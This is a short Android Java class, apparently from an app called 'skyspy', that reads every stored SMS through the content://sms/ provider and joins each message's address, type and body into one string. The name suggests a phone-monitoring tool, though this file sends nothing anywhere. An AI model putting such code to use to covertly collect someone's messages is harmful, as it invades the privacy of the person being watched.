package com.example.skyspy.app.sms.logic;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

public class SmsReader {

    public static String getAllSmsFromContent(Context context) {
        Uri smsUri = Uri.parse("content://sms/");
        Cursor cur = context.getContentResolver().query(smsUri, null, null, null,null);
        String sms = "";
        while (cur.moveToNext()) {
            for (int i = 0; i < cur.getColumnCount() - 1; i++) {
                //address(2) type(9) body(12)
                if (i == 2 || i == 9 || i == 12) {
                    sms += cur.getColumnName(i)+" "+cur.getString(i)+"\n";
                }
            }
            sms += "__________"+"\n";
        }
        return sms;
    }
}
